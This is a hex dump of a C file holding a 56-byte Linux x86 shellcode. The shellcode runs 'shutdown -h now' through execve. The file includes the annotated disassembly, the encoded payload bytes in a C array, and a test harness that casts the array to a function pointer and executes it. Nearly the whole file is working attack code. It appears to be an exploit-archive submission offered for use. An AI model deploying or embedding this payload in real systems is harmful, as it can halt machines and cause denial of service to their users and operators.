00000000  2f 2a 0a 3b 20 54 69 74  6c 65 3a 20 73 68 75 74  |/*.; Title: shut|
00000010  64 6f 77 6e 20 2d 68 20  6e 6f 77 20 53 68 65 6c  |down -h now Shel|
00000020  6c 63 6f 64 65 20 2d 20  35 36 20 62 79 74 65 73  |lcode - 56 bytes|
00000030  0a 3b 20 44 61 74 65 3a  20 32 30 31 34 2d 30 36  |.; Date: 2014-06|
00000040  2d 32 37 0a 3b 20 50 6c  61 74 66 6f 72 6d 3a 20  |-27.; Platform: |
00000050  6c 69 6e 75 78 2f 78 38  36 0a 3b 20 41 75 74 68  |linux/x86.; Auth|
00000060  6f 72 3a 20 4f 73 61 6e  64 61 20 4d 61 6c 69 74  |or: Osanda Malit|
00000070  68 20 4a 61 79 61 74 68  69 73 73 61 20 28 40 4f  |h Jayathissa (@O|
00000080  73 61 6e 64 61 4d 61 6c  69 74 68 29 0a 0a 44 69  |sandaMalith)..Di|
00000090  73 61 73 73 65 6d 62 6c  79 20 6f 66 20 73 65 63  |sassembly of sec|
000000a0  74 69 6f 6e 20 2e 74 65  78 74 3a 0a 0a 30 38 30  |tion .text:..080|
000000b0  34 38 30 36 30 20 3c 5f  73 74 61 72 74 3e 3a 0a  |48060 <_start>:.|
000000c0  38 30 34 38 30 36 30 3a  20 20 20 20 33 31 20 63  |8048060:    31 c|
000000d0  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
000000e0  20 20 20 20 78 6f 72 20  20 20 20 65 61 78 2c 65  |    xor    eax,e|
000000f0  61 78 0a 38 30 34 38 30  36 32 3a 20 20 20 20 33  |ax.8048062:    3|
00000100  31 20 64 32 20 20 20 20  20 20 20 20 20 20 20 20  |1 d2            |
00000110  20 20 20 20 20 20 20 78  6f 72 20 20 20 20 65 64  |       xor    ed|
00000120  78 2c 65 64 78 0a 38 30  34 38 30 36 34 3a 20 20  |x,edx.8048064:  |
00000130  20 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |  50            |
00000140  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000150  20 65 61 78 0a 38 30 34  38 30 36 35 3a 20 20 20  | eax.8048065:   |
00000160  20 36 36 20 36 38 20 32  64 20 36 38 20 20 20 20  | 66 68 2d 68    |
00000170  20 20 20 20 20 20 20 20  20 70 75 73 68 77 20 20  |         pushw  |
00000180  30 78 36 38 32 64 0a 38  30 34 38 30 36 39 3a 20  |0x682d.8048069: |
00000190  20 20 20 38 39 20 65 37  20 20 20 20 20 20 20 20  |   89 e7        |
000001a0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
000001b0  20 20 65 64 69 2c 65 73  70 0a 38 30 34 38 30 36  |  edi,esp.804806|
000001c0  62 3a 20 20 20 20 35 30  20 20 20 20 20 20 20 20  |b:    50        |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
000001e0  73 68 20 20 20 65 61 78  0a 38 30 34 38 30 36 63  |sh   eax.804806c|
000001f0  3a 20 20 20 20 36 61 20  36 65 20 20 20 20 20 20  |:    6a 6e      |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000210  68 20 20 20 30 78 36 65  0a 38 30 34 38 30 36 65  |h   0x6e.804806e|
00000220  3a 20 20 20 20 36 36 20  63 37 20 34 34 20 32 34  |:    66 c7 44 24|
00000230  20 30 31 20 36 66 20 37  37 20 20 20 20 6d 6f 76  | 01 6f 77    mov|
00000240  20 20 20 20 57 4f 52 44  20 50 54 52 20 5b 65 73  |    WORD PTR [es|
00000250  70 2b 30 78 31 5d 2c 30  78 37 37 36 66 0a 38 30  |p+0x1],0x776f.80|
00000260  34 38 30 37 35 3a 20 20  20 20 38 39 20 65 37 20  |48075:    89 e7 |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000280  20 20 6d 6f 76 20 20 20  20 65 64 69 2c 65 73 70  |  mov    edi,esp|
00000290  0a 38 30 34 38 30 37 37  3a 20 20 20 20 35 30 20  |.8048077:    50 |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  20 20 20 20 20 70 75 73  68 20 20 20 65 61 78 0a  |     push   eax.|
000002c0  38 30 34 38 30 37 38 3a  20 20 20 20 36 38 20 36  |8048078:    68 6|
000002d0  34 20 36 66 20 37 37 20  36 65 20 20 20 20 20 20  |4 6f 77 6e      |
000002e0  20 20 20 20 70 75 73 68  20 20 20 30 78 36 65 37  |    push   0x6e7|
000002f0  37 36 66 36 34 0a 38 30  34 38 30 37 64 3a 20 20  |76f64.804807d:  |
00000300  20 20 36 38 20 37 33 20  36 38 20 37 35 20 37 34  |  68 73 68 75 74|
00000310  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000320  20 30 78 37 34 37 35 36  38 37 33 0a 38 30 34 38  | 0x74756873.8048|
00000330  30 38 32 3a 20 20 20 20  36 38 20 36 65 20 32 66  |082:    68 6e 2f|
00000340  20 32 66 20 32 66 20 20  20 20 20 20 20 20 20 20  | 2f 2f          |
00000350  70 75 73 68 20 20 20 30  78 32 66 32 66 32 66 36  |push   0x2f2f2f6|
00000360  65 0a 38 30 34 38 30 38  37 3a 20 20 20 20 36 38  |e.8048087:    68|
00000370  20 32 66 20 37 33 20 36  32 20 36 39 20 20 20 20  | 2f 73 62 69    |
00000380  20 20 20 20 20 20 70 75  73 68 20 20 20 30 78 36  |      push   0x6|
00000390  39 36 32 37 33 32 66 0a  38 30 34 38 30 38 63 3a  |962732f.804808c:|
000003a0  20 20 20 20 38 39 20 65  33 20 20 20 20 20 20 20  |    89 e3       |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
000003c0  20 20 20 65 62 78 2c 65  73 70 0a 38 30 34 38 30  |   ebx,esp.80480|
000003d0  38 65 3a 20 20 20 20 35  32 20 20 20 20 20 20 20  |8e:    52       |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
000003f0  75 73 68 20 20 20 65 64  78 0a 38 30 34 38 30 38  |ush   edx.804808|
00000400  66 3a 20 20 20 20 35 36  20 20 20 20 20 20 20 20  |f:    56        |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000420  73 68 20 20 20 65 73 69  0a 38 30 34 38 30 39 30  |sh   esi.8048090|
00000430  3a 20 20 20 20 35 37 20  20 20 20 20 20 20 20 20  |:    57         |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000450  68 20 20 20 65 64 69 0a  38 30 34 38 30 39 31 3a  |h   edi.8048091:|
00000460  20 20 20 20 35 33 20 20  20 20 20 20 20 20 20 20  |    53          |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000480  20 20 20 65 62 78 0a 38  30 34 38 30 39 32 3a 20  |   ebx.8048092: |
00000490  20 20 20 38 39 20 65 31  20 20 20 20 20 20 20 20  |   89 e1        |
000004a0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
000004b0  20 20 65 63 78 2c 65 73  70 0a 38 30 34 38 30 39  |  ecx,esp.804809|
000004c0  34 3a 20 20 20 20 62 30  20 30 62 20 20 20 20 20  |4:    b0 0b     |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
000004e0  76 20 20 20 20 61 6c 2c  30 78 62 0a 38 30 34 38  |v    al,0xb.8048|
000004f0  30 39 36 3a 20 20 20 20  63 64 20 38 30 20 20 20  |096:    cd 80   |
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000510  69 6e 74 20 20 20 20 30  78 38 30 0a 0a 2a 2f 0a  |int    0x80..*/.|
00000520  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000530  2e 68 3e 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |.h>.#include <st|
00000540  72 69 6e 67 2e 68 3e 0a  0a 75 6e 73 69 67 6e 65  |ring.h>..unsigne|
00000550  64 20 63 68 61 72 20 63  6f 64 65 5b 5d 20 3d 20  |d char code[] = |
00000560  20 22 5c 78 33 31 5c 78  63 30 5c 78 33 31 5c 78  | "\x31\xc0\x31\x|
00000570  64 32 5c 78 35 30 5c 78  36 36 5c 78 36 38 5c 78  |d2\x50\x66\x68\x|
00000580  32 64 22 0a 22 5c 78 36  38 5c 78 38 39 5c 78 65  |2d"."\x68\x89\xe|
00000590  37 5c 78 35 30 5c 78 36  61 5c 78 36 65 5c 78 36  |7\x50\x6a\x6e\x6|
000005a0  36 5c 78 63 37 22 0a 22  5c 78 34 34 5c 78 32 34  |6\xc7"."\x44\x24|
000005b0  5c 78 30 31 5c 78 36 66  5c 78 37 37 5c 78 38 39  |\x01\x6f\x77\x89|
000005c0  5c 78 65 37 5c 78 35 30  22 0a 22 5c 78 36 38 5c  |\xe7\x50"."\x68\|
000005d0  78 36 34 5c 78 36 66 5c  78 37 37 5c 78 36 65 5c  |x64\x6f\x77\x6e\|
000005e0  78 36 38 5c 78 37 33 5c  78 36 38 22 0a 22 5c 78  |x68\x73\x68"."\x|
000005f0  37 35 5c 78 37 34 5c 78  36 38 5c 78 36 65 5c 78  |75\x74\x68\x6e\x|
00000600  32 66 5c 78 32 66 5c 78  32 66 5c 78 36 38 22 0a  |2f\x2f\x2f\x68".|
00000610  22 5c 78 32 66 5c 78 37  33 5c 78 36 32 5c 78 36  |"\x2f\x73\x62\x6|
00000620  39 5c 78 38 39 5c 78 65  33 5c 78 35 32 5c 78 35  |9\x89\xe3\x52\x5|
00000630  36 22 0a 22 5c 78 35 37  5c 78 35 33 5c 78 38 39  |6"."\x57\x53\x89|
00000640  5c 78 65 31 5c 78 62 30  5c 78 30 62 5c 78 63 64  |\xe1\xb0\x0b\xcd|
00000650  5c 78 38 30 22 3b 0a 0a  69 6e 74 0a 6d 61 69 6e  |\x80";..int.main|
00000660  28 29 20 7b 0a 0a 70 72  69 6e 74 66 28 22 53 68  |() {..printf("Sh|
00000670  65 6c 6c 63 6f 64 65 20  4c 65 6e 67 74 68 3a 20  |ellcode Length: |
00000680  20 25 64 5c 6e 22 2c 20  28 69 6e 74 29 73 74 72  | %d\n", (int)str|
00000690  6c 65 6e 28 63 6f 64 65  29 29 3b 0a 69 6e 74 20  |len(code));.int |
000006a0  28 2a 72 65 74 29 28 29  20 3d 20 28 69 6e 74 28  |(*ret)() = (int(|
000006b0  2a 29 28 29 29 63 6f 64  65 3b 0a 72 65 74 28 29  |*)())code;.ret()|
000006c0  3b 0a 0a 72 65 74 75 72  6e 20 30 3b 0a 7d        |;..return 0;.}|
000006ce
